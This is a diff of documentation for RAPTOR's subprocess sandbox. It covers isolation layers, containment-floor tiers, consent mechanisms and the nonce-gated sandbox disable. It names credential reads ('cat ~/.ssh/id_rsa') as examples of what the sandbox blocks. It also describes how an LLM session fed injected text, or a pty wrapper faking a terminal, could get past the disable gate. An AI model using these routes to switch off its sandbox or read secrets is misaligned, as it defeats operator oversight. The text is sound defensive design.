@@ -1,522 +1,680 @@
-# Subprocess Sandbox
+# Sandbox
 
-RAPTOR sandboxes any subprocess that handles untrusted content — LLM-generated
-PoCs, target build scripts, CodeQL queries, semgrep, fuzz targets, anything
-whose arguments or input came from a repo under analysis. This page covers
-what the sandbox protects against, how to invoke it, and how to read the
-diagnostics it emits.
+[Documentation index](README.md)
 
-## When to use which entry point
+RAPTOR's default untrusted-execution entry points sandbox target code,
+LLM-generated PoCs, and repository-derived tool inputs. On Linux they compose
+namespaces, Landlock, seccomp-bpf, and resource limits. The required containment
+floor determines whether a missing layer causes refusal or an explicitly
+consented degradation.
 
-| Entry point | Use when | Network | Landlock | Seccomp | rlimits |
-|---|---|---|---|---|---|
-| `run_untrusted()` | command or its input is attacker-derived | blocked | enforced (restrict_reads) | full | yes |
-| `sandbox()` + `run()` | you need fine-grained control (allowed TCP ports, egress proxy, no network ns) | configurable | configurable | configurable | yes |
-| `run_trusted()` | RAPTOR chose the command AND its inputs; no untrusted content flows into it | open | off | off | yes |
-| `run()` (top-level) | you know which kwargs you need; one-shot convenience over `sandbox()` | configurable | configurable | configurable | yes |
+Trusted-tool entry points have a different contract, and operator-selected
+disabled/degraded profiles provide fewer protections. Consult the profile and
+containment-floor sections before treating a run as isolated.
 
-Rule of thumb: **default to `run_untrusted()`**. Downgrade to `sandbox()` only
-when the tool genuinely needs something the untrusted defaults deny (e.g. a
-CodeQL sub-agent that needs `api.anthropic.com` on port 443). Downgrade to
-`run_trusted()` only when the full command line is RAPTOR-owned and no
-attacker-derived bytes feed into it.
+On macOS, the same machinery routes through `sandbox-exec(1)` and
+Seatbelt profiles. See [Platform support](#platform-support) for the
+capability comparison.
 
-## Quick start
+For CLI flags, see the [slash-command reference](commands.md).
 
-```python
-from core.sandbox import run_untrusted
+---
 
-# Run a compiled target binary that was built from an untrusted repo.
-result = run_untrusted(
-    [target_binary, "--flag", input_file],
-    target=repo_path,          # bind-mounted / Landlock-allowed ro
-    output=work_dir,            # writable scratch area
-    limits={"memory_mb": 2048, "cpu_seconds": 30},
-    capture_output=True,
-)
-```
+Start with the guarantees and [containment floor](#containment-floor) before
+choosing a [profile](#profiles). For a refused run, use
+[Troubleshooting](#troubleshooting) to identify the missing host capability.
 
-What this gets you:
+**Related documentation:**
+[Agent Security](agent-security.md) |
+[Configuration](configuration.md) |
+[Troubleshooting](troubleshooting.md)
 
-- network blocked at the namespace level (no interfaces inside)
-- filesystem restricted to `target` (read-only), `output` (writable), `/tmp`
-  (fresh tmpfs), and a curated system-dir read allowlist
-- `$HOME` redirected to an empty per-sandbox directory
-- dangerous syscalls blocked: io_uring, kcmp, pidfd_getfd, handle_at,
-  TIOCSTI/TIOCCONS, SysV IPC, ptrace (in `full`), keyctl, bpf, userfaultfd,
-  perf_event_open, plus `socket()` for AF_UNIX / AF_PACKET / AF_NETLINK /
-  SOCK_RAW (docker.sock escape, raw-packet sniffing)
-- RLIMIT_CORE = 0 (no core-dump exfil), memory/CPU caps, and a `prlimit
-  --nproc=<limit>` wrapper sitting *inside* the `unshare` chain so
-  RLIMIT_NPROC counts against the namespace-local UID — bounds fork bombs
-  per sandbox
+**On this page:**
+
+- [What a sandboxed run gets you](#what-a-sandboxed-run-gets-you)
+- [Isolation layers](#isolation-layers)
+- [Containment floor](#containment-floor)
+- [Profiles](#profiles)
+- [Egress proxy](#egress-proxy)
+- [LLM dispatcher response-scan jail](#llm-dispatcher-response-scan-jail)
+- [Audit and observe modes](#audit-and-observe-modes)
+- [Binary calibration](#binary-calibration)
+- [Observability](#observability)
+- [Resource limits](#resource-limits)
+- [When the sandbox cannot engage](#when-the-sandbox-cannot-engage)
+- [Supervised process trees (not a sandbox)](#supervised-process-trees-not-a-sandbox)
+- [Toolchain env for builds](#toolchain-env-for-builds)
+- [Host-fingerprint sanitisation](#host-fingerprint-sanitisation)
+- [Platform support](#platform-support)
+- [Host and network perimeter](#host-and-network-perimeter)
+- [Known limitations](#known-limitations)
+- [Troubleshooting](#troubleshooting)
+- [Namespace supervision outside the sandbox](#namespace-supervision-outside-the-sandbox)
+- [Related documentation](#related-documentation)
+
+## What a sandboxed run gets you
+
+- Network blocked at the namespace level (fresh namespace with only an
+  isolated loopback interface — no route out).
+- Filesystem restricted to the target (read-only), the run's output
+  directory (writable), a fresh per-sandbox `/tmp`, and a curated
+  system-directory read allowlist. `$HOME` redirected to an empty
+  per-sandbox directory, so `cat ~/.ssh/id_rsa`, `~/.aws/credentials`,
+  and `~/.config/raptor/models.json` all come back empty or denied.
+- Dangerous syscalls blocked: `io_uring`, `ptrace` (in `full`),
+  `keyctl`, `bpf`, `userfaultfd`, `perf_event_open`, tty-injection
+  ioctls, raw/packet/netlink sockets, plus namespace creation on the
+  fork-backend lane (`unshare` / `clone` with any `CLONE_NEW*` flag /
+  `setns`; `clone3` returns ENOSYS) so a target cannot build a nested
+  namespace to confuse the supervisor. The plain subprocess lane
+  installs the same namespace-creation deny rules via its preexec —
+  its payload never legitimately unshares. (The former unshare-CLI
+  lane was the one lane that could not take them, because its own
+  bootstrap had to `unshare` under the filter; it was deleted in
+  favour of the fork backend.)
+- No core dumps, memory/CPU caps, and a per-sandbox process cap that
+  bounds fork bombs.
+- Environment sanitised through a strict allowlist; API keys and other
+  credentials never reach untrusted children.
+
+Programmatically, `core.sandbox` exposes two trust levels:
+`run_untrusted()` / `run_untrusted_networked()` for anything
+attacker-derived (read restriction and fake home on by default), and
+`run_trusted()` for commands whose full command line is RAPTOR-owned
+(env sanitisation and rlimits only). The finer-grained `sandbox()` /
+`run()` API sits underneath; its docstrings are the reference.
 
 ## Isolation layers
 
-The sandbox composes up to six layers. Each falls back gracefully if the kernel
-doesn't support it — RAPTOR logs a warning once per layer per process.
+The sandbox composes up to six layers. Backend selection and the requested
+containment floor determine which layers are mandatory; a missing required
+layer causes refusal unless the operator accepts an eligible degraded tier.
 
-1. **User namespace** (`unshare --user`) — unprivileged root-mapping foundation.
-2. **Network namespace** (`--net`) — sandboxed process sees no interfaces.
-   Active under `full`, `debug`, `network-only` profiles.
-3. **PID namespace** (`--pid --fork`) — hides host PIDs; target runs as PID 1.
-4. **IPC namespace** (`--ipc`) — isolates SysV shm/sem/message queues.
-5. **Mount namespace** (pivot_root onto a fresh tmpfs) — per-sandbox `/tmp`
-   and `/run`, host system dirs (`/usr`, `/lib`, `/etc` etc.) bind-mounted
-   read-only, caller's `target` + `output` bind-mounted at their ORIGINAL
-   absolute paths (no caller argv rewriting needed). Uses `newuidmap`
-   (from the `uidmap` package) for the user-ns mapping and drives mount
-   syscalls from Python via ctypes BEFORE Landlock install — otherwise
-   Landlock (on kernel 6.15+) would block the mount topology changes.
-   **Disabled on Ubuntu 24.04 by default** (AppArmor sysctl gates
-   unprivileged user-ns); see [Troubleshooting](#troubleshooting).
-6. **Landlock + seccomp-bpf + rlimits** — always applied when available, even
-   when namespaces fall back.
+1. **User namespace** -- unprivileged root-mapping foundation.
+2. **Network namespace** -- sandboxed process sees only an isolated
+   loopback interface; no route out. The coordinator-internal
+   `inherit_netns=` escape (paired-isolation runs that must stay in a
+   shared isolated netns) is never silent: dropping a requested
+   network block is stamped per run (`netns_inherited`), warned once
+   per process, and refused for untrusted-contract calls.
+3. **PID namespace** -- combined with a fresh in-namespace `/proc`
+   mount, hides host PIDs and blocks cross-process
+   `/proc/<pid>/environ` credential reads. The fresh mount is
+   mandatory for untrusted runs: if it fails, the run aborts rather
+   than exposing the host-pid process table (override with
+   `RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1`). The spawn chain additionally
+   zeroes credential values out of its own environment image, so
+   even a host-procfs-visible degrade has nothing to read.
+4. **IPC namespace** -- isolates SysV shm/sem/message queues.
+5. **Mount namespace** -- per-sandbox `/tmp` and `/run`, host system
+   dirs bind-mounted read-only, target and output bind-mounted at
+   their original absolute paths. When a caller-supplied `/etc`
+   overlay targets entries the host does not have, `/etc` becomes a
+   private tmpfs populated by a budgeted copy of the host's (64 MiB /
+   8192 entries, breadth-first so `passwd`, `hosts`, and TLS trust
+   roots copy first; `/etc/skel` and non-regular entries are never
+   copied). **Disabled on Ubuntu 24.04 by
+   default** (AppArmor gates unprivileged user namespaces); see
+   [Troubleshooting](#troubleshooting).
+   If namespace creation succeeds but the bind tree cannot be built,
+   trusted tool runs can keep the network, PID, IPC, fresh-proc, Landlock,
+   seccomp, and rlimit layers through the mountless backend. Untrusted runs
+   require the existing `RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1` opt-in.
+6. **Landlock + seccomp-bpf + rlimits** -- always applied when
+   available, even when namespaces fall back.
 
-On kernels that lack any particular layer, the sandbox proceeds with the
-remaining ones and emits a one-time warning. Nothing silently downgrades to
-"no isolation".
+Missing layers are reported. Untrusted runs proceed with fewer protections
+only when the chosen containment floor or explicit consent permits that
+posture; otherwise they fail closed.
 
-**Landlock is fail-closed.** If `landlock_restrict_self()` returns an error
-inside `preexec_fn` (kernel drift, ABI mismatch, EINVAL on a rule), the child
-calls `os._exit(126)` rather than continue unsandboxed. The parent sees a
-non-zero `result.returncode` plus a `RAPTOR: Landlock …` line on the child's
-stderr explaining which step failed.
+**Inherited descriptors:** Linux targets and audit tracers close all ambient
+descriptors before exec, retaining only standard streams and explicitly
+selected capabilities. The sweep covers existing descriptors above lowered
+file limits and does not require the target to read `/proc`. If the kernel
+range-close operation is unavailable, it enumerates actual open descriptors;
+if neither method is available, startup refuses rather than leaking them.
 
-### Profiles
+**Sandbox-root cleanup:** The unrestricted parent uses descriptor-based
+recursive deletion so a confined sibling cannot redirect cleanup through a
+swapped directory symlink. If safe recursive deletion is unavailable, it
+leaves non-empty stubs behind rather than traversing them by pathname.
+
+**Landlock is fail-closed.** If installing the Landlock ruleset fails
+in the child (kernel drift, ABI mismatch), the run never continues
+unsandboxed. On the mount-ns spawn lane the failure reports through
+the setup-status pipe and the parent raises a typed
+`SandboxSetupError` (`setup_category` `"L"`) naming the failing step —
+attributable, and unspoofable by a target that happens to exit 126.
+On the preexec lane, where raising is not fork-safe, the child exits
+126; the parent sees the non-zero return code plus a
+`sandbox: Landlock ...` line on stderr explaining which step failed.
+
+**Untrusted runs refuse to degrade silently.** On Linux hosts without
+unprivileged user namespaces, untrusted execution fails closed with a
+`SandboxSetupError` naming the host fix. Setting
+`RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1` is the explicit operator acceptance
+of Landlock/seccomp-only containment (see
+[environment.md](environment.md)); every waived run warns that same-UID
+`/proc` credential reads are not blocked in that mode.
+
+---
+
+## Containment floor
+
+The sandbox enforces untrusted-execution requirements through a single
+two-sided contract instead of per-lane checks. Execution lanes form a
+total order of **containment tiers** per platform:
+
+| Tier | Lane | Delivers |
+|---|---|---|
+| `mount-ns` | fork spawn backend | pivot_root bind tree, full namespace set, fresh procfs, Landlock, seccomp |
+| `mountless-ns` | fork spawn backend, no bind tree | full namespace set, fresh procfs, Landlock, seccomp; host paths visible by name |
+| `ns-only` | fork spawn backend, Landlock-absent mode | full namespace set, fresh procfs, seccomp; no Landlock filesystem/TCP policy (kernels without Landlock, floor-consented only) |
+| `landlock` | plain subprocess | Landlock, seccomp, rlimits; host namespaces |
+| `none` | plain subprocess | rlimits only |
+| `seatbelt` | macOS `sandbox-exec` | SBPL write/read scoping, network denial, process-info denial (macOS's top tier; never compared to Linux tiers) |
+
+Each call resolves a **floor** once at entry: untrusted work
+(`run_untrusted*` and every caller passing the `require_fresh_procfs`
+contract) floors at `mount-ns` on Linux and `seatbelt` on macOS by
+default; the consent chain below can move it; trusted calls have no
+floor (`none`) and keep their existing enforceability refusals; the
+operator's explicit `--sandbox none` / `--no-sandbox` /
+`disabled=True` remains globally authoritative (floor `none`) — and
+the CLI spelling of that disable is itself consent-gated (see
+[Disabling the sandbox](#disabling-the-sandbox)).
+Nothing consents untrusted work to a bare run implicitly.
+
+### Consent surfaces
+
+The untrusted floor is resolved from one precedence chain (highest
+wins):
+
+```
+--sandbox-floor <tier>  >  /project set sandbox-floor <tier>
+                        >  RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1
+                        >  WSL host-consent marker  >  default (refuse)
+```
+
+* **`--sandbox-floor {mount-ns,mountless-ns,ns-only,landlock,none}`**
+  — per-run consent, parsed only from entry-point argparse (same
+  prompt-injection posture as `--sandbox`). It works in **both
+  directions**: `--sandbox-floor landlock` accepts
+  Landlock/seccomp-only containment for this run's untrusted work on
+  a host without user namespaces; `--sandbox-floor mount-ns` pins the
+  full contract, overriding a project setting or the env waiver. Each
+  value consents **exactly its named tier and nothing lower** — a
+  lane below the consented floor still refuses. `ns-only` is the
+  consent for Landlock-less kernels (namespaces, fresh procfs and
+  seccomp still enforced). The value `none` is **not** a consentable
+  untrusted floor: it parses, but untrusted-class work under it
+  refuses loudly, naming the authoritative `--sandbox none` /
+  `--no-sandbox` surface — untrusted work never runs bare by consent.
+  Nested RAPTOR workers inherit the flag on their command lines (the
+  `/agentic` sandbox passthrough); no environment variable expresses
+  it, so target code can neither observe nor influence the consent.
+* **`/project set sandbox-floor <tier>`** — the standing project
+  surface (registry-validated; `none` is refused at `set` time).
+  Consumed once at run start like the trust markers, with the same
+  one-target rule (the consent applies only when the run's target is
+  the project's target) and a banner line whenever it affects a run.
+  Dispatched workers re-read it through their run-pin bootstrap.
+* **`RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1`** — the legacy env var, kept
+  indefinitely with a **frozen meaning**: untrusted floor :=
+  `landlock` on Linux (it never reaches `none` there; on macOS it
+  keeps its documented rlimits-only acceptance). All new consent
+  semantics ship only on the explicit surfaces.
+* **WSL host-consent marker** — a standing, host-scoped consent to
+  exactly the `ns-only` tier for the one situation where that tier
+  is the deliverable maximum: a WSL kernel without Landlock. Granted
+  only through the TTY-gated `bin/raptor wsl-consent grant` ceremony
+  and conditional at read time (inert off WSL, inert the moment the
+  kernel gains Landlock, inert across a kernel-flavour change or on
+  another machine, fail-closed on a corrupt record). Lowest
+  precedence: it only ever replaces the default refusal — a floor
+  any other surface chose, higher or lower, is never moved by it.
+  Full semantics in [wsl.md](wsl.md).
+
+When surfaces disagree, the explicit surface wins and a banner names
+both sides and both values (e.g. a paranoid `--sandbox-floor
+mount-ns` over a CI-wide env waiver refuses the degraded lanes and
+says why). Floor refusals always carry the exact re-run remedies —
+the flag spelling, the project spelling, and the env var — with the
+honesty rule preserved: when an explicit surface pinned the floor,
+the refusal says the env var will NOT relax it. In an unattended
+session the refusal stands (fail closed); an interactive session may
+offer the remedies as a structured choice, but never selects a floor
+on the operator's behalf. The degraded-**network** acceptance is a
+separate axis and stays env-var-only — a tier floor never consents
+the network posture. The **seccomp-absence** acceptance is also
+env-var-only in the lowering direction (no `--sandbox-floor` tier
+waives a missing libseccomp — every tier's contract includes the
+filter), and it is WITHDRAWN whenever an explicit surface pins a
+floor: an operator who typed `--sandbox-floor mount-ns` gets the
+full contract, filter included, even on a host where CI exported the
+env waiver. Two reach notes: the project consumption is wired at the
+run entry points and dispatch helpers that execute untrusted/target
+code (`/agentic`, `/codeql`, `/fuzz`, their scanner and CodeQL-agent
+workers, the `/audit` CLI, and the `/validate` helper); and the
+construction-time Landlock-enforceability acceptance follows the
+same chain for ALL calls (the env var's existing host-wide reach) —
+an explicitly raised floor therefore also refuses that acceptance
+for trusted policy-bearing calls on Landlock-less kernels.
+
+Enforcement is two-sided: an entry-time check refuses
+statically-knowable shapes up front with the full remedy text, and a
+hard runtime assertion inside the **checked dispatch chokepoint** —
+the only construct in the sandbox module that hands a command to an
+executor — compares the lane's declared tier against the floor
+immediately before invoking it. A demotion that would cross the floor
+converts into a typed `SandboxFloorError` (a `SandboxSetupError`
+subtype carrying `floor`/`achievable`/`setup_category`) chained to the
+original backend failure. A future demotion lane routed through the
+chokepoint therefore fails closed if it sits below the floor. Two
+backstops guard the chokepoint itself: an AST executor gate in the
+contract tests forbids in-module spawning outside it (bare
+`subprocess.run`/`Popen`/`os.exec*` calls, module aliasing, and
+direct spawn-callable imports all refuse), and a runtime dominance
+stamp makes run()'s epilogue reject any result that did not pass
+through the chokepoint — catching an executor added in another
+module at its first use. In-process code that deliberately subverts
+the module is outside the threat model — it is already the
+orchestrator.
+
+Every result stamps the posture: `sandbox_info["containment_tier"]`
+(the tier the call actually ran at — per-call posture reductions such
+as `skip_pid_ns`, which keeps the host procfs on both spawn lanes, cap
+the stamp accordingly), `containment_floor`, and `floor_source`
+(`default` / `flag` / `project` / `env` / `operator-disable`);
+tracked runs merge the
+weakest tier per run directory into `sandbox-summary.json`'s posture
+record. When a consent surface lowers the floor, a one-line banner
+names the surface, and every consented call that lands on a
+reduced lane (`ns-only` or below) warns individually — naming the
+host process table when the lane leaves it visible, or the missing
+Landlock policy layer on the `ns-only` tier (which keeps a fresh
+pid-ns procfs); the mountless fallback keeps its existing
+once-per-process notice.
+
+**What a floor refusal looks like at the verification seams.** The
+attacker-payload executors — `/audit`'s dark-witness execution,
+exploit execution (`--execute-exploits`), and the mitigation-profile
+witness replay — map a floor refusal to a structured **unverifiable
+environment** outcome instead of a hypothesis verdict: the finding's
+record keeps its existing error-shaped vocabulary (a dark-verify
+`verdict: "error"`, an execution outcome of `unknown`) and carries a
+detail payload with `status: "unverifiable_environment"`, the required
+`floor`, the `achievable` tier, and the operator `remedies`. The
+semantics are record-then-raise: the refusal is host-deterministic, so
+the first one records that verdict on the finding it was verifying,
+prints one summary line (`1 execution(s) refused: environment cannot
+meet the containment floor (mount-ns required, landlock achievable) —
+remedies: ...`), and re-raises the typed error so the run fails loudly
+rather than continuing to mint identical refusals. An unverifiable
+environment is neither a confirmation nor a refutation — fix the host
+(or consent to a lower floor) and re-run.
+
+The refusal is also recorded at run level: whenever a floor refusal
+fires for a call that has a run/audit directory, the sandbox appends
+a `floor_refusal` record to the run's evidence stream, and
+`sandbox-summary.json` then carries `total_floor_refusals`, the
+structured `floor_refusals` records, and a `floor_refusal_line`
+rendered in the same wording as the per-finding summary line — so a
+run whose payload executions were refused is distinguishable from a
+run that simply recorded nothing, even after the fact.
+
+### Disabling the sandbox
+
+`--no-sandbox` / `--sandbox none` is a **request** for tier `none`,
+honoured only when the invocation carries a consent of matching
+authority. Anything that can compose a command line reaches these
+flags — including an LLM session assembling a `python3 raptor.py ...`
+invocation from injected text — so the flag alone is not evidence an
+operator chose a bare run. The ONLY consent source is the **minted
+nonce**: `RAPTOR_NO_SANDBOX_NONCE` carries a nonce minted by
+`core/sandbox/scripts/mint-no-sandbox-nonce`, backed by a fresh
+(600 s), mode-0600, uid-owned consent file under the invoking user's
+home. The env var alone grants nothing (it is plain composable data);
+the file alone grants nothing (it stores only the nonce's digest).
+Minting is a deliberate, attributable act. A live nonce is multi-use
+within its window by design — one exported consent covers the spine
+children that re-validate it independently — bounded by the TTL and
+the uid-owned mode-0600 file checks. The refusal message points at
+this section rather than quoting the runnable mint path: a refusal
+that hands the refused composer a copy-pasteable mint command would
+be a bypass recipe.
+
+The operator lane is one mint per window:
+
+```sh
+RAPTOR_NO_SANDBOX_NONCE=$(core/sandbox/scripts/mint-no-sandbox-nonce) \
+    python3 raptor.py scan --repo <path> --no-sandbox
+```
+
+There is deliberately **no interactive-terminal consent arm** — and
+this is a behaviour change: a `--no-sandbox` command typed at a real
+terminal (including an interactive session's `!`-passthrough lane)
+now refuses unless a nonce was minted first. Terminal presence on the
+process fds carries no authority because it is manufacturable: a
+pseudo-terminal wrapper (`script -qec …`, Python `pty.spawn`) hands
+any composed child real TTYs on stdin/stderr with no operator
+present, and the signals that might distinguish a laundered pty from
+an operator's terminal (session leadership, ctty coherence, pty age,
+master-holder ancestry) are each either manufacturable by the same
+composer or invalid on real terminal topologies (terminal
+multiplexers and sshd hold the pty master from an ancestor position
+exactly like a wrapper does). Requiring the mint converts the
+cheapest bypass from an innocuous-looking wrapper into an explicit,
+self-describing, artifact-leaving action.
+
+Without a consent the run **refuses** — a single-line argparse error
+(exit 2) naming the flag, the reason, and both escape hatches: the
+mint route (by documentation anchor), and `--audit` for debugging
+enforcement without going bare. The disable is never silently
+re-enabled or downgraded; refusal preserves the operator's ability to
+decide.
+
+There is deliberately **no standing consent**: no project setting can
+disable the sandbox (`/project set sandbox-floor` refuses `none`),
+trust markers grant nothing here, and the nonce var is never part of
+the safe-env allowlist — target-bound environments strip it, so
+scanned code can neither observe nor replay a live consent. The strip
+holds even on the keep-trust dispatch lane that keeps RAPTOR's own
+markers: trust markers and disable-consent are different authorities,
+and a dispatched child never inherits a live nonce.
+
+What the gate honestly claims is **guardrail plus attribution**, not
+a security boundary against same-uid code execution: a same-uid
+unsandboxed composer can run the mint script itself. That is accepted
+— with the programmatic `sandbox(disabled=True)` keyword deliberately
+ungated, no userspace consent design stops same-uid arbitrary code
+execution; the mint path is kept off the runtime and `libexec`
+dispatch surfaces, is self-describing in any audit trail, and leaves
+a durable consent artifact. And when a patient composer does present
+a minted nonce it obtained that way, the stamp says `nonce`, which is
+true (a mint happened and is on disk) — attribution stays honest even
+in the abuse case.
+
+An accepted disable is attributable after the fact:
+`sandbox_info["disable_consent"]` on every run result names the
+consent source (`nonce`), and the acceptance is
+logged at WARNING with the same label. RAPTOR's own pipeline parents
+that forward the flag to workers (the `/agentic` sandbox passthrough)
+extend their already-accepted consent across the spawn boundary
+automatically — consent extension is possible only from a process
+that already holds one, never creatable from nothing.
+
+The attribution persists past the process too: a run executed with an
+accepted disable writes `sandbox-summary.json` even with zero denials
+(nothing was enforced, so there is nothing else to write), carrying
+`cli_sandbox_disabled: true` plus `disable_consent`, both bound into
+the summary's integrity token — stripping or rewriting either field
+reads as tampering on the verifying triage path. Operator CLIs
+surface the record as a run-context line: `raptor-verified-outcomes`
+prefixes its human summary with the disable and its consent source
+(the `--json` output shape is unchanged — the annotation is
+human-render only), and the scorecard `tool-evidence` join notes when
+the validation run it is grading against executed unsandboxed.
+
+The programmatic `sandbox(disabled=True)` keyword is unchanged: it is
+not reachable from argv, and in-process code is already the
+orchestrator.
+
+---
+
+## Profiles
 
 Profiles bundle layer settings into a single name for CLI use:
+`--sandbox <profile>` on any RAPTOR command that honours it.
 
 | Profile | Network | Landlock | Seccomp | Notes |
 |---|---|---|---|---|
-| `full` | blocked | yes | full | default for `run_untrusted()` and `sandbox()` |
-| `debug` | blocked | yes | full (permits ptrace) | for `/crash-analysis` with gdb/rr |
-| `network-only` | blocked | off | off | tools whose correctness needs unrestricted fs |
-| `none` | open | off | off | emergency escape hatch; rlimits only |
+| `full` | blocked | yes | full | The default. Warns and degrades if a host layer is missing (untrusted entry points excepted — see above). |
+| `strict` | blocked | yes | full | Fail-closed version of `full`. For autonomous work where weaker isolation is not acceptable. Also requires mount namespaces when target/output isolation is requested. |
+| `target_run` | **open** | yes | full | For harness-spawned target binaries that need a local listener (loopback TCP, Unix domain sockets). Paired processes (server + client) can share one isolated network namespace. |
+| `debug` | blocked | yes | debug (permits ptrace) | For [crash analysis](crash-analysis.md) with GDB/LLDB. Target and debugger run in the same sandbox. Composes with `--audit`. |
+| `rr` | blocked; private loopback only | yes | rr (ptrace and per-task counters) | Linux replay; requires private mount/PID/network namespaces and functional seccomp. General lower-floor consent cannot relax this requirement. |
+| `frida` | **open** | yes | frida (AF_UNIX allowed) | For [Frida](frida.md) helper IPC. Netlink/packet/raw sockets stay blocked. |
+| `chromium` | requested TCP ports | yes | chromium | Required browser containment. Read-only runtime, private HOME/scratch and fresh Linux mount/PID namespaces or macOS Seatbelt; no fallback to an unconfined browser. |
+| `network-only` | blocked | off | none | Tools whose correctness needs unrestricted filesystem or syscalls. |
+| `none` | open | off | none | Emergency escape hatch. Rlimits only. |
 
-CLI: `--sandbox <profile>` on any RAPTOR command that honours it.
+Use `--sandbox strict` when a run should stop rather than quietly carry
+on with less isolation. On macOS, the strict profile adds
+probe-validated Seatbelt denies (cross-process signals, nvram, a
+curated mach-lookup allowlist) on top of `full`.
 
-**Audit mode** is engaged orthogonally via `--audit` (and optionally
-`--audit-verbose` for strace-style output). It composes with any profile
-that has enforcement layers — i.e., `full` or `debug`. Combinations:
+Every generated macOS Seatbelt policy denies lookup and registration of known
+host brokers for application launching, keychain access, preference writes,
+filesystem events and distributed notifications. AppleEvent sends, preference
+writes and notification posts remain denied even in audit mode. Debugger and
+browser exceptions preserve their required capabilities without reopening
+these broker channels. This is a targeted broker boundary, not a complete Mach
+service allowlist for specialized profiles. Explicitly disabling the sandbox
+still bypasses Seatbelt entirely.
 
-| Invocation | Effect |
-|---|---|
-| `--sandbox full` (default) | full enforcement |
-| `--sandbox full --audit` | full layout, but proxy gate logs-and-allows + tracer logs would-be-blocked syscalls + filtered fs/connect tracing |
-| `--sandbox full --audit --audit-verbose` | same as above but tracer logs EVERY traced syscall (strace-style diagnosis) |
-| `--sandbox debug --audit` | gdb-friendly seccomp + audit signal — operators running `/crash-analysis` can also see what enforcement would have blocked |
-| `--sandbox network-only --audit` | only the egress-proxy gate audits (other layers off). Coherent but most layers no-op |
-| `--sandbox none --audit` | **error** — incoherent (nothing to audit against) |
-| `--audit-verbose` without `--audit` | **error** — audit-verbose only controls tracer output |
+**Read-denial recovery:** `--sandbox-readable-path PATH` (repeatable;
+file or directory) extends the read allowlist of every read-restricting
+sandbox in the run, and `--sandbox-tool-path DIR` (repeatable) makes an
+operator-installed tool directory visible inside the sandbox
+(read-only — pip `--user`, pyenv, `~/.cargo/bin`, `/usr/local`
+installs). The loop: run with `--audit` to see what enforcement would
+deny, read `suggested_fix` in `sandbox-summary.json`, then re-run with
+the named path. Both flags loosen isolation — grant the narrowest path
+that fixes the denial, never `$HOME` itself. Paths are validated at
+parse time; the flags are rejected alongside `--sandbox none` /
+`--no-sandbox` (no allowlist to extend).
 
-### Audit mode in detail
+**Tool visibility:** the mount-namespace sandbox bind-mounts a fixed
+set of system dirs; a tool installed anywhere else (`~/.local/bin/`,
+`/opt/homebrew/bin/`) would be invisible (exit 127). The sandbox retries
+through its namespace backend without the bind tree when a bind mount or
+in-tree exec fails. This keeps the PID, user, IPC, and network namespaces,
+fresh procfs, Landlock, seccomp, limits, and proxy bridge active. The result
+reports `backend=landlock-pidns` and `mount_ns_active=false`; tracked runs also
+write `posture.mountless_backend=true` in `sandbox-summary.json`. Callers can opt
+tool directories in
+(`--sandbox-tool-path`, or `tool_paths=` programmatically — with
+`python_runtime_tool_paths()` auto-discovering the running Python's
+runtime roots for Python tools). If the reduced namespace backend cannot
+mount fresh procfs or apply Landlock, seccomp, or namespaces, the call fails
+closed before the target executes. The fallback preserves the caller's read
+policy. Host paths remain visible by name, including an `ENOENT` versus
+`EACCES` filesystem-existence oracle. Landlock cannot block metadata changes
+such as `chmod` outside the write allowlist. For read-restricted calls, every
+mountless lane replaces the construction-time `/tmp` and `/dev/shm` write
+grants with a private mode-`0700` scratch directory and points `TMPDIR`,
+`TEMP`, and `TMP` at it. Explicit non-shared writable paths remain available.
+Calls with
+`restrict_reads=False` retain their historical writable baseline, which means
+host `/tmp` and `/dev/shm` are writable when the bind tree is absent.
+Untrusted runs therefore
+require `RAPTOR_ALLOW_DEGRADED_UNTRUSTED=1`. On Landlock ABI below 3,
+where `truncate()` outside the write allowlist is not controlled, the
+mountless backend is not achievable for untrusted or read-restricted
+work at all: an unwaived untrusted run is refused at its containment
+floor, and a waived (or trusted read-restricted) run continues down the
+demotion ladder to a lane its floor admits — a lane whose weaker,
+documented contract the consent covers — instead of retrying a
+mountless lane whose write policy the kernel cannot enforce.
 
-`--audit` (composed with any compatible profile) runs a workflow to
-completion AND records what enforcement WOULD have blocked. It's the
-soft-default fallback for the case where `full` is too strict for
-the workload but operators still want visibility into the policy
-violations — far better than reaching for `--sandbox none` (which
-loses all observability).
+Declaring a directory via `tool_paths` is also how `$HOME`-resident
+toolchains stay runnable: the sandboxed child's environment scrub
+drops every home-rooted `PATH` entry, EXCEPT entries that equal or sit
+under a declared `tool_paths` dir (matched by both the literal and the
+symlink-resolved spelling). Declare `~/.cargo/bin` and a rustup
+toolchain resolves by name inside the sandbox; leave it undeclared and
+the entry is scrubbed, so the exec fails with ENOENT (exit 127).
 
-Programmatic equivalent: `sandbox(profile=..., audit=True)` or
-`run(..., audit=True)`. The CLI flag composes with any profile
-automatically.
+If a tool genuinely needs a config file from your real home, copy it
+into the sandbox's fake home (`<output>/.home/`) before the run. Git is
+the exception: internal git runs with global/system config disabled
+unconditionally, no matter what is placed in the fake home. Parent-side
+HOME/XDG directory creation and fake-HOME intake reads use pinned directory
+descriptors. A sibling's directory-to-symlink swap cannot redirect those
+operations onto outside host files; a symlinked intake root is refused.
 
-Three layers, audit-mode each:
-
-| Layer | Mechanism | Behaviour |
-|---|---|---|
-| Network (egress proxy) — **only when `use_egress_proxy=True`** | hostname allowlist gate emits `would_deny_host` event AND records to `sandbox-summary.json`, then permits the CONNECT | resolved-IP block (DNS-rebinding defense) stays enforcing — purely-attack pattern, no legitimate-workflow false positives. Without the proxy, the namespace network block applies normally and there's nothing to audit-log. |
-| Syscalls (seccomp) | swaps deny action from `SCMP_ACT_ERRNO(EPERM)` to `SCMP_ACT_TRACE`; tracer logs each blocked syscall + resumes | the existing blocklist (ptrace, bpf, io_uring, etc.) is observed instead of EPERM'd |
-| Filesystem (`open` / `openat`) | tracer derefs path arg, resolves relative paths via `/proc/<pid>/cwd` and `/proc/<pid>/fd/<dirfd>`, matches against the Landlock allowlist | filtered mode logs only paths that would have been blocked; verbose mode logs every traced open. Symlink-following diverges from real Landlock (we don't readlink in the tracer) so a small number of edge cases over-report. |
